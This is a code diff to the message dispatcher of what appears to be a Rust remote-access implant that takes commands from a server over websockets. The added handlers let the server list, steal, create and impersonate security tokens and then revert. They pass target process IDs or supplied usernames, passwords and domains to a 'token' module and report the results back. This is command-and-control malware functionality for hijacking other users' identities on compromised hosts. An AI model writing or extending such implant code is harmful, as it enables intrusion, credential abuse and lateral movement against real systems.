@@ -278,6 +278,44 @@ pub(crate) async fn dispatch(
             ws_send(tx, &agent_id, "proxy.fetch.result", &r, rid).await;
         }
 
+        // ── Token vault (cloud module) ───────────────────────
+        ws_type::TOKEN_LIST => {
+            let r = run_module(module_manager, "token", serde_json::json!({
+                "op": "list"
+            })).await;
+            ws_send(tx, &agent_id, "token.list.result", &r, rid).await;
+        }
+        ws_type::TOKEN_STEAL => {
+            let pid = data_u64(&data, "pid", 0) as u32;
+            let r = run_module(module_manager, "token", serde_json::json!({
+                "op": "steal", "pid": pid
+            })).await;
+            ws_send(tx, &agent_id, "token.steal.result", &r, rid).await;
+        }
+        ws_type::TOKEN_MAKE => {
+            let username = data_str(&data, "username", "");
+            let password = data_str(&data, "password", "");
+            let domain = data_str(&data, "domain", ".");
+            let r = run_module(module_manager, "token", serde_json::json!({
+                "op": "make", "username": username, "password": password, "domain": domain
+            })).await;
+            ws_send(tx, &agent_id, "token.make.result", &r, rid).await;
+        }
+        ws_type::TOKEN_IMPERSONATE => {
+            let id = data_u64(&data, "id", 0) as u32;
+            let pid = data_u64(&data, "pid", 0) as u32;
+            let r = run_module(module_manager, "token", serde_json::json!({
+                "op": "impersonate", "id": id, "pid": pid
+            })).await;
+            ws_send(tx, &agent_id, "token.impersonate.result", &r, rid).await;
+        }
+        ws_type::TOKEN_REVERT => {
+            let r = run_module(module_manager, "token", serde_json::json!({
+                "op": "revert"
+            })).await;
+            ws_send(tx, &agent_id, "token.revert.result", &r, rid).await;
+        }
+
         // ── Plugin generic execution ─────────────────────────────
         // Server relays a declared module invocation. Two kinds:
         //   - kind="script"  -> run the `script` module (Rhai sandbox) with
